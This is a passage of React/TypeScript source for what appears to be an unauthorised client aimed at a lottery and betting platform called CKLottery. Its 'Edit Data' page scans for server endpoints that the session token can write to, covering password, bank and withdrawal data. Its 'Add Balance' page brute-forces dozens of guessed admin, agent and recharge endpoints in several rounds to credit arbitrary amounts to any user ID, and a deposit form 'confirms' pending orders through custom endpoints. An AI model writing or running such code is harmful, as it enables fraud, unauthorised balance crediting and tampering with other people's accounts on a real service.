                {/* Confirm / auto-approve status for pending orders */}
                {isPending && (
                  <div className="mt-3 pt-3 border-t border-gray-100 space-y-2">
                    {apv?.ok ? (
                      <div className="text-green-600 text-sm font-medium flex items-center gap-1.5">
                        <span>✅</span> Confirmed on server!
                      </div>
                    ) : apv?.loading ? (
                      <div className="text-blue-500 text-sm flex items-center gap-1.5">
                        <span className="animate-spin">⏳</span> Submitting…
                      </div>
                    ) : (
                      <>
                        {apv?.err && (
                          <div className="text-orange-600 text-xs bg-orange-50 rounded-lg p-2">{apv.err.split("\n")[0]}</div>
                        )}
                        {/* TX ID input — WavePay ref or USDT TX hash */}
                        <div className="text-xs text-gray-500 font-medium">Payment transaction ID / TX hash</div>
                        <div className="flex gap-2">
                          <input
                            type="text"
                            placeholder="WavePay ref or USDT TX hash"
                            value={approveTxId[orderNo] ?? ""}
                            onChange={e => setApproveTxId(p => ({ ...p, [orderNo]: e.target.value }))}
                            className="flex-1 border border-gray-200 rounded-xl px-3 py-2 text-xs text-gray-800 bg-gray-50 focus:outline-none focus:border-blue-400"
                          />
                          <button
                            type="button"
                            onClick={() => approveDeposit(item, approveTxId[orderNo], approveCustomEndpoint[orderNo])}
                            className="bg-blue-500 text-white px-3 py-2 rounded-xl font-semibold text-xs active:opacity-80 whitespace-nowrap"
                          >
                            Confirm
                          </button>
                        </div>
                        {/* Advanced: custom endpoint */}
                        <input
                          type="text"
                          placeholder="Custom endpoint (optional, e.g. UpRechargesBankOrder)"
                          value={approveCustomEndpoint[orderNo] ?? ""}
                          onChange={e => setApproveCustomEndpoint(p => ({ ...p, [orderNo]: e.target.value }))}
                          className="w-full border border-gray-100 rounded-xl px-3 py-1.5 text-xs text-gray-500 bg-gray-50 focus:outline-none focus:border-blue-300"
                        />
                      </>
                    )}
                  </div>
                )}
              </div>
            );
          })}
        </div>
      )}
    </SubPage>
  );

  if (page === "withdraw") return (
    <SubPage title="📤 Withdraw History" onBack={() => setPage("main")}>
      <ListState loading={withdrawsLoading} error={withdrawsError} empty={!withdrawsLoading && !withdrawsError && withdraws.length === 0} onCfFix={handleCfFix} onRetry={loadWithdraws} />
      {!withdrawsLoading && !withdrawsError && withdraws.length > 0 && (
        <div className="space-y-3">
          {withdraws.map((item, i) => {
            const amt = pick(item, ["withdrawAmount", "money", "amount", "withdrawMoney", "actualAmount", "orderAmount"]);
            const dt = pick(item, ["createTime", "addTime", "tradeTime", "time", "date", "orderTime"]);
            const statusStr = pick(item, ["statusText", "statusTip", "statusName", "statusStr"]);
            const skipKeys = ["status", "withdrawAmount", "money", "amount", "withdrawMoney", "actualAmount", "orderAmount",
              "createTime", "addTime", "tradeTime", "time", "date", "orderTime",
              "statusText", "statusTip", "statusName", "statusStr"];
            return (
              <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
                <div className="flex justify-between items-start mb-2">
                  <div>
                    <div className="text-base font-bold text-gray-900">
                      {amt !== undefined ? `K${amt}` : "K—"}
                    </div>
                    <div className="text-xs text-gray-400 mt-0.5">{dt !== undefined ? String(dt) : "—"}</div>
                  </div>
                  <StatusBadge status={item.status} str={statusStr as string | undefined} />
                </div>
                <RecordFields item={item} skip={skipKeys} />
              </div>
            );
          })}
        </div>
      )}
    </SubPage>
  );

  if (page === "game") {
    const totalBet = games.reduce((sum, g) => sum + Number(pick(g, ["betAmount", "orderMoney", "money", "amount"]) ?? 0), 0);
    const totalWin = games.reduce((sum, g) => sum + Number(pick(g, ["winAmount", "profit", "winMoney", "bonus", "award"]) ?? 0), 0);
    const netPnl = totalWin - totalBet;
    const allTypes = [...new Set(
      games.map(g => String(pick(g, ["gameName", "gameCode", "typeName", "gameType", "gameTypeName"]) ?? ""))
           .filter(Boolean)
    )];
    const filtered = gamesFilter === "all"
      ? games
      : games.filter(g => String(pick(g, ["gameName", "gameCode", "typeName", "gameType", "gameTypeName"]) ?? "") === gamesFilter);

    return (
      <SubPage title="🎮 Game History" onBack={() => setPage("main")}>
        <ListState loading={gamesLoading} error={gamesError} empty={!gamesLoading && !gamesError && games.length === 0} onCfFix={handleCfFix} onRetry={loadGames} />

        {!gamesLoading && !gamesError && games.length > 0 && (
          <>
            {/* Summary bar */}
            <div className="grid grid-cols-3 gap-2 mb-4">
              <div className="bg-white rounded-2xl shadow-sm p-3 text-center">
                <div className="text-xs text-gray-400 mb-0.5">Bets</div>
                <div className="text-base font-bold text-gray-800">{games.length}</div>
              </div>
              <div className="bg-white rounded-2xl shadow-sm p-3 text-center">
                <div className="text-xs text-gray-400 mb-0.5">Wagered</div>
                <div className="text-sm font-bold text-gray-800">K{totalBet.toLocaleString(undefined, { maximumFractionDigits: 2 })}</div>
              </div>
              <div className="bg-white rounded-2xl shadow-sm p-3 text-center">
                <div className="text-xs text-gray-400 mb-0.5">Net P&amp;L</div>
                <div className={`text-sm font-bold ${netPnl >= 0 ? "text-green-500" : "text-red-500"}`}>
                  {netPnl >= 0 ? "+" : "−"}K{Math.abs(netPnl).toLocaleString(undefined, { maximumFractionDigits: 2 })}
                </div>
              </div>
            </div>

            {/* Game type filter tabs */}
            {allTypes.length > 1 && (
              <div className="flex gap-2 overflow-x-auto pb-2 mb-3">
                {(["all", ...allTypes] as string[]).map(t => (
                  <button
                    key={t}
                    type="button"
                    onClick={() => setGamesFilter(t)}
                    className={`flex-shrink-0 px-3 py-1.5 rounded-full text-xs font-semibold transition-colors ${
                      gamesFilter === t
                        ? "bg-blue-500 text-white"
                        : "bg-white text-gray-500 shadow-sm"
                    }`}
                  >
                    {t === "all" ? `All (${games.length})` : t}
                  </button>
                ))}
              </div>
            )}

            {/* Record cards */}
            <div className="space-y-3">
              {filtered.map((item, i) => {
                const gameName = String(pick(item, ["gameName", "gameCode", "typeName", "gameType", "gameTypeName"]) ?? `Bet #${i + 1}`);
                const betAmt   = pick(item, ["betAmount", "orderMoney", "money", "amount"]);
                const winAmt   = pick(item, ["winAmount", "profit", "winMoney", "bonus", "award"]);
                const netAmt   = winAmt !== undefined ? Number(winAmt) - Number(betAmt ?? 0) : undefined;
                const dt       = pick(item, ["createTime", "addTime", "betTime", "time", "date", "orderTime"]);
                const period   = pick(item, ["issueNumber", "period", "periodNum", "issue", "roundId", "roundNum", "periodNumber"]);
                const selection = pick(item, ["betContent", "selectContent", "content", "select", "guess", "betNum", "number", "color"]);
                const isWin    = winAmt !== undefined ? Number(winAmt) > Number(betAmt ?? 0) : undefined;
                const skipKeys = [
                  "gameName", "gameCode", "typeName", "gameType", "gameTypeName",
                  "betAmount", "orderMoney", "winAmount", "profit", "winMoney", "bonus", "award",
                  "createTime", "addTime", "betTime", "time", "date", "orderTime",
                  "issueNumber", "period", "periodNum", "issue", "roundId", "roundNum", "periodNumber",
                  "betContent", "selectContent", "content", "select", "guess", "betNum", "number", "color",
                  "money", "amount",
                ];
                return (
                  <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
                    {/* Header row: game name + win/loss badge */}
                    <div className="flex justify-between items-start mb-2">
                      <div className="flex-1 min-w-0">
                        <div className="text-sm font-bold text-gray-800 truncate">{gameName}</div>
                        {period !== undefined && (
                          <div className="text-xs text-gray-400 mt-0.5">Period #{String(period)}</div>
                        )}
                      </div>
                      {isWin !== undefined && (
                        <span className={`ml-2 flex-shrink-0 text-xs font-semibold px-2.5 py-0.5 rounded-full ${
                          isWin ? "bg-green-100 text-green-600" : "bg-red-100 text-red-500"
                        }`}>
                          {isWin ? "Win" : "Loss"}
                        </span>
                      )}
                    </div>

                    {/* Stats grid */}
                    <div className="grid grid-cols-2 gap-x-4 gap-y-1 mb-1.5">
                      {betAmt !== undefined && (
                        <div className="text-xs text-gray-400">
                          Bet: <span className="text-gray-700 font-medium">K{Number(betAmt).toLocaleString()}</span>
                        </div>
                      )}
                      {winAmt !== undefined && (
                        <div className="text-xs text-gray-400">
                          Win: <span className="text-gray-700 font-medium">K{Number(winAmt).toLocaleString()}</span>
                        </div>
                      )}
                      {netAmt !== undefined && (
                        <div className="text-xs text-gray-400">
                          P&amp;L:{" "}
                          <span className={`font-medium ${netAmt >= 0 ? "text-green-500" : "text-red-500"}`}>
                            {netAmt >= 0 ? "+" : "−"}K{Math.abs(netAmt).toLocaleString(undefined, { maximumFractionDigits: 2 })}
                          </span>
                        </div>
                      )}
                      {selection !== undefined && (
                        <div className="text-xs text-gray-400">
                          Pick: <span className="text-gray-700 font-medium">{String(selection)}</span>
                        </div>
                      )}
                    </div>

                    {dt !== undefined && (
                      <div className="text-xs text-gray-400 border-t border-gray-50 pt-1.5 mt-1">{String(dt)}</div>
                    )}
                    <RecordFields item={item} skip={skipKeys} />
                  </div>
                );
              })}
            </div>

            {/* Pagination */}
            <div className="mt-4">
              {gamesHasMore ? (
                <button
                  type="button"
                  onClick={loadMoreGames}
                  disabled={gamesLoadingMore}
                  className="w-full py-3 bg-white rounded-2xl shadow-sm text-sm font-semibold text-blue-500 active:opacity-70 disabled:opacity-50"
                >
                  {gamesLoadingMore ? "Loading…" : "Load More"}
                </button>
              ) : (
                <div className="text-center text-xs text-gray-300 py-3">— End of records —</div>
              )}
            </div>
          </>
        )}
      </SubPage>
    );
  }

  if (page === "transaction") return (
    <SubPage title="💸 Transaction History" onBack={() => setPage("main")}>
      <ListState loading={transactionsLoading} error={transactionsError} empty={!transactionsLoading && !transactionsError && transactions.length === 0} onCfFix={handleCfFix} onRetry={loadTransactions} />
      {!transactionsLoading && !transactionsError && transactions.length > 0 && (
        <div className="space-y-3">
          {transactions.map((item, i) => (
            <div key={i} className="bg-white rounded-2xl shadow-sm p-4">
              <div className="flex justify-between items-center mb-1">
                <div>
                  <div className="text-sm font-semibold text-gray-800">{String(item.typeName ?? item.type ?? item.remark ?? `#${i + 1}`)}</div>
                  <div className="text-xs text-gray-400">{String(item.createTime ?? item.time ?? "—")}</div>
                </div>
                <div className={`text-sm font-bold ${Number(item.amount ?? 0) >= 0 ? "text-green-500" : "text-red-500"}`}>
                  {Number(item.amount ?? 0) >= 0 ? "+" : ""}K{String(item.amount ?? "—")}
                </div>
              </div>
            </div>
          ))}
        </div>
      )}
    </SubPage>
  );

  // ─── TOKEN INFO PAGE ──────────────────────────────────────────────────────────
  if (page === "tokenInfo") {
    const rawJwt   = decodeJwt(session.token) ?? {};
    const jwtClaims = initialUserInfo?._jwtClaims as Record<string, unknown> ?? {};
    // Merge both — rawJwt has low-level fields (exp, iat), jwtClaims has app fields
    const allClaims: Record<string, unknown> = { ...rawJwt, ...jwtClaims };

    const expTs  = Number(rawJwt.exp ?? 0) * 1000;
    const iatTs  = Number(rawJwt.iat ?? 0) * 1000;
    const now    = Date.now();
    const expired = expTs > 0 && now > expTs;
    const minsLeft = expTs > 0 ? Math.max(0, Math.round((expTs - now) / 60000)) : null;
    const fmtDate  = (ms: number) => ms ? new Date(ms).toLocaleString() : "—";

    const CONTROLS = [
      { icon: "💳", label: "Wallet",       desc: "All wallet balances" },
      { icon: "📥", label: "Deposit",      desc: "Create & view deposit orders" },
      { icon: "📤", label: "Withdraw",     desc: "View withdrawal history" },
      { icon: "💎", label: "VIP",          desc: "VIP level & benefits" },
      { icon: "🎮", label: "Game History", desc: "Bet records with P&L" },
      { icon: "💸", label: "Transaction",  desc: "Full transaction log" },
      { icon: "🔄", label: "Balance",      desc: "Live server balance refresh" },
      { icon: "➕", label: "Add Balance",  desc: "Parallel endpoint probe (3 rounds)" },
    ];

    // Helper: render a key-value table from any object
    function KVTable({ data, label }: { data: Record<string, unknown> | null; label: string }) {
      if (!data || Object.keys(data).length === 0)
        return <div className="text-xs text-gray-400 italic py-1">No data yet — loading…</div>;
      return (
        <div className="space-y-0.5">
          {Object.entries(data).map(([k, v]) => {
            if (v === null || v === undefined || k === "_jwtClaims") return null;
            const display = typeof v === "object" ? JSON.stringify(v) : String(v);
            return (
              <div key={k} className="flex gap-2 py-1 border-b border-gray-50 last:border-0">
                <span className="text-xs text-gray-400 font-mono w-36 shrink-0 break-all">{k}</span>
                <span className="text-xs text-gray-800 font-medium break-all flex-1">{display}</span>
              </div>
            );
          })}
        </div>
      );
    }

    return (
      <SubPage title="🔑 Token Info" onBack={() => setPage("main")}>

        {/* ── TOKEN STATUS ── */}
        <div className={`rounded-2xl p-4 mb-3 text-white shadow ${expired ? "bg-red-500" : "bg-gradient-to-r from-green-500 to-emerald-600"}`}>
          <div className="flex items-center justify-between">
            <div>
              <div className="text-xs opacity-75 mb-0.5">Token Status</div>
              <div className="text-lg font-bold">{expired ? "⛔ EXPIRED" : "✅ VALID"}</div>
            </div>
            <div className="text-right text-xs opacity-90 space-y-0.5">
              {minsLeft !== null && !expired && (
                <div className="font-bold text-base">{minsLeft < 60 ? `${minsLeft} min left` : `${Math.floor(minsLeft/60)}h ${minsLeft%60}m left`}</div>
              )}
              <div>Issued: {fmtDate(iatTs)}</div>
              <div>Expires: {fmtDate(expTs)}</div>
            </div>
          </div>
        </div>

        {/* ── JWT CLAIMS (raw) ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-bold text-gray-800 mb-2">📋 JWT Claims ({Object.keys(allClaims).length} fields)</div>
          <KVTable data={allClaims} label="JWT" />
        </div>

        {/* ── SERVER ACCOUNT DATA ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="flex items-center justify-between mb-2">
            <div className="text-sm font-bold text-gray-800">👤 Account Data (GetUserInfo)</div>
            <button type="button" onClick={refreshBalance} disabled={balanceLoading}
              className="text-blue-500 text-xs font-bold disabled:opacity-40">
              {balanceLoading ? "…" : "↻"}
            </button>
          </div>
          {balanceError && <div className="text-xs text-red-400 mb-1">{balanceError}</div>}
          <KVTable data={userInfo} label="userInfo" />
        </div>

        {/* ── VIP DATA ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="text-sm font-bold text-gray-800 mb-2">💎 VIP Data (GetVipUserLevelDetail)</div>
          <KVTable data={vipData} label="vipData" />
        </div>

        {/* ── WALLETS ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="flex items-center justify-between mb-2">
            <div className="text-sm font-bold text-gray-800">💳 Wallets (GetAllwallets)</div>
            <button type="button" onClick={loadWallets} disabled={walletsLoading}
              className="text-blue-500 text-xs font-bold disabled:opacity-40">
              {walletsLoading ? "…" : "↻"}
            </button>
          </div>
          {walletsError && <div className="text-xs text-red-400 mb-1">{walletsError}</div>}
          <KVTable data={wallets} label="wallets" />
        </div>

        {/* ── AVAILABLE CONTROLS ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-16">
          <div className="text-sm font-bold text-gray-800 mb-3">🎛️ Available Controls ({CONTROLS.length})</div>
          <div className="space-y-2">
            {CONTROLS.map(c => (
              <div key={c.label} className="flex items-center gap-3 py-1.5 border-b border-gray-50 last:border-0">
                <span className="text-xl w-7 shrink-0">{c.icon}</span>
                <div>
                  <div className="text-xs font-semibold text-gray-800">{c.label}</div>
                  <div className="text-xs text-gray-400">{c.desc}</div>
                </div>
              </div>
            ))}
          </div>
        </div>
      </SubPage>
    );
  }

  // ─── EDIT DATA PAGE ───────────────────────────────────────────────────────────
  if (page === "editData") {
    type ProbeHit = { cat: string; ep: string; code: unknown; msg: string; fields: string[] };

    const CAT_META: Record<string, { icon: string; label: string }> = {
      profile:  { icon: "👤", label: "Profile" },
      security: { icon: "🔐", label: "Security / Password" },
      contact:  { icon: "📞", label: "Contact" },
      finance:  { icon: "🏦", label: "Bank / Finance" },
      safe:     { icon: "🔒", label: "Safe / Savings" },
      withdraw: { icon: "📤", label: "Withdrawal" },
    };

    async function runProbe() {
      setEdProbing(true); setEdHits([]); setEdDone(false);
      try {
        const res = await fetch("/api/proxy/probe-writable", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: buildAuth(session),
            "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
            ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
          },
          body: JSON.stringify({}),
        });
        const data = await res.json() as { results: ProbeHit[] };
        setEdHits(data.results ?? []);
      } catch (e) {
        setEdHits([]);
      }
      setEdProbing(false); setEdDone(true);
    }

    async function submitEndpoint(ep: string, fields: string[]) {
      setEdSubmit(p => ({ ...p, [ep]: { loading: true, ok: false, msg: "" } }));
      const inputs = edInputs[ep] ?? {};
      const payload: Record<string, unknown> = { ...inputs };
      // Add userId if available
      const uid2 = Number(userInfo?.userId ?? userInfo?.id ?? 0);
      if (uid2) { payload.userId = uid2; payload.uid = uid2; }
      try {
        const res = await fetch(`/api/proxy/ck/${ep}`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            Authorization: buildAuth(session),
            "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
            ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
          },
          body: JSON.stringify(payload),
        });
        const data = await res.json() as Record<string, unknown>;
        const code = data.code ?? data.Code;
        const msg = String(data.msg ?? data.message ?? JSON.stringify(data));
        if (code === 0 || code === "0") {
          setEdSubmit(p => ({ ...p, [ep]: { loading: false, ok: true, msg: `✅ ${msg}` } }));
          refreshBalance();
        } else {
          setEdSubmit(p => ({ ...p, [ep]: { loading: false, ok: false, msg: `code=${String(code)} — ${msg}` } }));
        }
      } catch (e) {
        setEdSubmit(p => ({ ...p, [ep]: { loading: false, ok: false, msg: String(e) } }));
      }
    }

    // Group hits by category
    const grouped = Object.keys(CAT_META).map(cat => ({
      cat,
      ...CAT_META[cat],
      hits: edHits.filter(h => h.cat === cat),
    })).filter(g => g.hits.length > 0);

    return (
      <SubPage title="✏️ Edit Data" onBack={() => setPage("main")}>

        {/* ── PROBE ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="flex items-center justify-between mb-1">
            <div>
              <div className="text-sm font-bold text-gray-800">🔍 Writable Endpoint Scanner</div>
              <div className="text-xs text-gray-400 mt-0.5">Finds which changes your token can make on the server</div>
            </div>
            <button type="button" disabled={edProbing} onClick={runProbe}
              className="bg-indigo-500 disabled:bg-indigo-300 text-white text-xs font-bold px-4 py-2 rounded-xl active:opacity-80">
              {edProbing ? "Scanning…" : edDone ? "Re-scan" : "Scan Now"}
            </button>
          </div>
          {edDone && (
            <div className={`mt-2 text-xs font-semibold px-3 py-2 rounded-xl ${edHits.length > 0 ? "bg-green-50 text-green-700" : "bg-gray-50 text-gray-500"}`}>
              {edHits.length > 0
                ? `✅ ${edHits.length} writable endpoint(s) found — forms below`
                : "❌ No writable endpoints found with this token"}
            </div>
          )}
        </div>

        {/* ── RESULTS BY CATEGORY ── */}
        {grouped.map(g => (
          <div key={g.cat} className="bg-white rounded-2xl shadow-sm p-4 mb-3">
            <div className="text-sm font-bold text-gray-800 mb-3">{g.icon} {g.label}</div>
            <div className="space-y-4">
              {g.hits.map(hit => {
                const st = edSubmit[hit.ep];
                const inp = edInputs[hit.ep] ?? {};
                return (
                  <div key={hit.ep} className="border border-gray-100 rounded-xl p-3">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-mono font-bold text-indigo-700">{hit.ep}</span>
                      <span className={`text-[10px] px-2 py-0.5 rounded-full font-semibold ${hit.code === 0 || hit.code === "0" ? "bg-green-100 text-green-700" : "bg-yellow-100 text-yellow-700"}`}>
                        code={String(hit.code)}
                      </span>
                    </div>
                    {hit.msg && <div className="text-xs text-gray-400 mb-2 truncate">{hit.msg.slice(0, 80)}</div>}

                    {/* Input fields */}
                    {hit.fields.length > 0 && (
                      <div className="space-y-2 mb-2">
                        {hit.fields.map(f => (
                          <input key={f} type={f.toLowerCase().includes("password") || f.toLowerCase().includes("pwd") || f.toLowerCase().includes("pin") ? "password" : "text"}
                            placeholder={f}
                            value={inp[f] ?? ""}
                            onChange={e => setEdInputs(prev => ({ ...prev, [hit.ep]: { ...prev[hit.ep], [f]: e.target.value } }))}
                            className="w-full border border-gray-200 rounded-lg px-3 py-2 text-xs text-gray-800 bg-gray-50 focus:outline-none focus:border-indigo-300" />
                        ))}
                      </div>
                    )}

                    <button type="button"
                      disabled={st?.loading || (hit.fields.length > 0 && hit.fields.some(f => !inp[f]?.trim()))}
                      onClick={() => submitEndpoint(hit.ep, hit.fields)}
                      className="w-full bg-indigo-500 disabled:bg-indigo-200 text-white text-xs font-bold py-2 rounded-lg active:opacity-80">
                      {st?.loading ? "Submitting…" : `Apply ${hit.ep}`}
                    </button>

                    {st && !st.loading && (
                      <div className={`mt-2 text-xs px-2 py-1.5 rounded-lg break-all ${st.ok ? "bg-green-50 text-green-700" : "bg-red-50 text-red-600"}`}>
                        {st.msg}
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>
        ))}

        {!edDone && (
          <div className="text-center text-gray-400 text-xs py-8">
            Tap "Scan Now" to discover which data you can change with your token
          </div>
        )}
      </SubPage>
    );
  }

  if (page === "addBalance") {
    const uid = Number(userInfo?.userId ?? userInfo?.id ?? userInfo?.uid ?? 0);

    // All endpoint candidates to probe — recharge/admin/balance related
    const SCAN_ENDPOINTS = [
      // User-side deposit (webapi)
      "Recharge","MemberRecharge","UserRecharge","Deposit","AddRecharge",
      "OnlineRecharge","DirectRecharge","QuickRecharge",
      // Recharge approval
      "ConfirmRecharge","ManualRechargeSuccess","RechargeSuccess","AdminConfirmRecharge",
      "RechargeConfirm","AuditRecharge","PassRecharge","ApproveRecharge","RechargePass",
      "ManualRecharge","AdminRecharge","RechargeApprove","ConfirmDeposit","AdminApproveRecharge",
      "RechargeAudit","RechargeCheck","RechargeVerify","RechargeComplete","RechargeFinish",
      "RechargeOk","RechargeApproved","PassDeposit","AuditDeposit","DepositApprove",
      // Balance add/gift
      "GiftMoney","AddBalance","ManualTopup","GiftRecharge","AddUserBalance",
      "AdminAddBalance","AdminGiftMoney","GiftAmount","CreditBalance","AddCredit",
      "AdminManualRecharge","ManualCredit","RechargeByAdmin","AdminTopup",
      "AddMoney","CreditMoney","BonusMoney","GiftBonus","AddBonus",
      "AdminCredit","AdminTopUp","TopupBalance","DepositBalance","ManualDeposit",
      // User management
      "UpdateUserBalance","SetUserBalance","ModifyBalance","AdjustBalance",
      "AdminUpdateBalance","AdminSetBalance","AdminModifyBalance","ChangeBalance",
      // Transaction / order
      "CreateManualOrder","AdminCreateOrder","ManualOrder","AdminOrder",
      "CreateGiftOrder","GiftOrder","BonusOrder","AdminBonusOrder",
      // Agent / transfer
      "AgentTransfer","TransferMoney","AgentAddBalance","AgentGift",
      "AgentCredit","AgentTopup","TransferToUser","SendMoney","AgentRecharge",
      // Misc admin
      "AdminOperation","AdminAction","AdminRechargeManual","SystemRecharge",
      "SystemAddBalance","BackendRecharge","BackendAddBalance","OperatorRecharge",
    ];

    const SCAN_BASES_SHORT = ["webapi", "admin", "agent", "manage", "operator", "backend"];
    const isNotExistMsg = (m: string) =>
      m.includes("not exist") || m.includes("not found") || m.includes("no route") ||
      m.includes("invalid url") || m.includes("no such") || m.includes("unknown_base") || m.includes("404");

    const proxyPost = async (base: string, ep: string, body: Record<string, unknown>) => {
      const auth = buildAuth(session);
      const res = await fetch(`/api/proxy/ck-path/${base}/${ep}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          Authorization: auth,
          "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
          ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
        },
        body: JSON.stringify(body),
      });
      const text = await res.text();
      try { return JSON.parse(text) as Record<string, unknown>; } catch { return null; }
    };

    async function runScan() {
      setScanRunning(true); setScanResults([]); setScanDone(false);
      const total = SCAN_BASES_SHORT.length * SCAN_ENDPOINTS.length;
      setScanProgress({ done: 0, total });
      let done = 0;
      const probePayload = {
        amount: Number(addBalAmount) || 10000, money: Number(addBalAmount) || 10000,
        userId: Number(addBalUserId) || uid, uid: Number(addBalUserId) || uid, memberId: Number(addBalUserId) || uid,
        status: 1, state: 1,
      };
      for (const base of SCAN_BASES_SHORT) {
        for (const ep of SCAN_ENDPOINTS) {
          try {
            const result = await proxyPost(base, ep, probePayload);
            if (result) {
              const code = result.code ?? result.Code ?? result.status;
              const msg = String(result.msg ?? result.message ?? result.error ?? "");
              if (!isNotExistMsg(msg.toLowerCase())) {
                const hit = { base, ep, code, msg };
                setScanResults(prev => [...prev, hit]);
              }
            }
          } catch { /* skip */ }
          done++;
          setScanProgress({ done, total });
        }
      }
      setScanRunning(false); setScanDone(true);
    }

    async function doAddBalance() {
      const amt = Number(addBalAmount);
      if (!amt || amt <= 0) return;
      const targetUid = Number(addBalUserId) || uid;
      setAddBalLoading(true); setAddBalResult(null);

      const MAX_ROUNDS = 3;
      const auth = buildAuth(session);
      const reqHeaders = {
        "Content-Type": "application/json",
        Authorization: auth,
        "x-ck-token-header": (session.tokenHeader || "Bearer").trim(),
        ...(session.cfClearance ? { "x-ck-cf-clearance": session.cfClearance } : {}),
      };

      for (let round = 1; round <= MAX_ROUNDS; round++) {
        // Show live progress
        setAddBalResult({ ok: false, msg: `⏳ Round ${round}/${MAX_ROUNDS} — probing all endpoints…` });

        try {
          const res = await fetch("/api/proxy/add-balance", {
            method: "POST",
            headers: reqHeaders,
            body: JSON.stringify({
              userId: targetUid,
              amount: amt,
              customEndpoint: addBalCustomEp.trim() || undefined,
              round,
            }),
          });
          const data = await res.json() as {
            successes: { base: string; ep: string; code: unknown; msg: string }[];
            others:    { base: string; ep: string; code: unknown; msg: string }[];
          };

          if (data.successes.length > 0) {
            // ✅ STOP — found a working endpoint
            const hit = data.successes[0];
            setAddBalResult({ ok: true, msg: `✅ Success! [${hit.base}] ${hit.ep} — ${hit.msg}`.trim(), base: hit.base, ep: hit.ep });
            refreshBalance();
            setAddBalLoading(false);
            return;
          }

          // Build status for this round
          if (data.others.length > 0) {
            const top = data.others[0];
            setAddBalResult({ ok: false, msg: `Round ${round}/${MAX_ROUNDS}: ${data.others.length} endpoint(s) exist but rejected. Best: [${top.base}] ${top.ep} → ${top.msg.slice(0, 60)}` });
          } else {
            setAddBalResult({ ok: false, msg: `Round ${round}/${MAX_ROUNDS}: no responding endpoints found.` });
          }
        } catch (e) {
          setAddBalResult({ ok: false, msg: `Round ${round} error: ${String(e)}` });
        }

        // Brief pause before next round
        if (round < MAX_ROUNDS) await new Promise<void>(r => setTimeout(r, 600));
      }

      // All rounds exhausted
      setAddBalResult(prev => ({
        ok: false,
        msg: prev?.msg
          ? `${prev.msg}\n\n❌ All ${MAX_ROUNDS} rounds exhausted — no endpoint accepted the credit. CKLottery likely requires admin-panel credentials.`
          : `❌ All ${MAX_ROUNDS} rounds exhausted.`,
      }));
      setAddBalLoading(false);
    }

    const hitEps = scanResults.filter(r => r.code === 0 || r.code === "0");
    const otherEps = scanResults.filter(r => r.code !== 0 && r.code !== "0");
    const presets = [5000, 10000, 20000, 44000, 50000, 100000];

    return (
      <SubPage title="➕ Add Balance" onBack={() => setPage("main")}>

        {/* ── LIVE BALANCE (server) ── */}
        <div className="bg-gradient-to-r from-blue-500 to-indigo-600 rounded-2xl p-4 mb-3 text-white flex items-center justify-between shadow">
          <div>
            <div className="text-xs opacity-75 mb-0.5">Current Balance (Server)</div>
            {balanceLoading
              ? <div className="text-2xl font-bold animate-pulse">Loading…</div>
              : <div className="text-2xl font-bold">K{balance === "—" ? "—" : Number(balance).toLocaleString()}</div>
            }
            {balanceError && <div className="text-xs text-red-200 mt-0.5 truncate">{balanceError}</div>}
          </div>
          <button
            type="button"
            onClick={refreshBalance}
            disabled={balanceLoading}
            className="bg-white/20 hover:bg-white/30 disabled:opacity-50 text-white text-xs font-bold px-3 py-2 rounded-xl active:opacity-70"
          >
            <span className={balanceLoading ? "animate-spin inline-block" : ""}>↻</span>
          </button>
        </div>

        {/* ── SCANNER ── */}
        <div className="bg-white rounded-2xl shadow-sm p-4 mb-3">
          <div className="flex items-center justify-between mb-2">
            <div>
              <div className="text-sm font-semibold text-gray-800">🔍 Endpoint Scanner</div>
              <div className="text-xs text-gray-400 mt-0.5">
                {scanRunning
                  ? `${scanProgress.done}/${scanProgress.total} probed…`
                  : `${SCAN_BASES_SHORT.length} bases × ${SCAN_ENDPOINTS.length} endpoints`}
              </div>
            </div>
            <button
              type="button"
              disabled={scanRunning}
              onClick={runScan}
              className="bg-blue-500 disabled:bg-blue-300 text-white text-xs font-bold px-4 py-2 rounded-xl active:opacity-80"
            >
              {scanRunning ? "Scanning…" : scanDone ? "Re-scan" : "Scan Now"}
            </button>
          </div>

          {scanRunning && scanProgress.total > 0 && (
            <div className="w-full bg-gray-100 rounded-full h-1.5 mb-2">
              <div className="bg-blue-500 h-1.5 rounded-full transition-all"
                style={{ width: `${Math.round((scanProgress.done / scanProgress.total) * 100)}%` }} />
            </div>
          )}

          {(hitEps.length > 0 || otherEps.length > 0) && (
            <div className="space-y-1 max-h-52 overflow-y-auto mt-2">
              {hitEps.length > 0 && (
                <>
                  <div className="text-xs font-semibold text-green-600 mb-1">✅ code=0 (Working — {hitEps.length}):</div>
                  {hitEps.map((r, i) => (
                    <button key={i} type="button"
                      onClick={() => setAddBalCustomEp(r.ep)}
                      className="w-full text-left flex items-start gap-2 bg-green-50 rounded-lg px-3 py-1.5 active:bg-green-100">
                      <span className="text-green-500 text-xs font-bold shrink-0 mt-0.5">✅</span>
                      <div className="min-w-0">
                        <span className="text-xs font-mono font-bold text-green-800">[{r.base}] {r.ep}</span>
                        <div className="text-xs text-green-600 break-all leading-tight">{r.msg.slice(0, 80)}</div>
                      </div>
                    </button>
                  ))}
                </>
              )}
              {otherEps.length > 0 && (
                <>
                  <div className="text-xs font-semibold text-yellow-600 mt-2 mb-1">⚠️ Exists, other code ({otherEps.length}):</div>
                  {otherEps.map((r, i) => (
                    <button key={i} type="button"
                      onClick={() => setAddBalCustomEp(r.ep)}
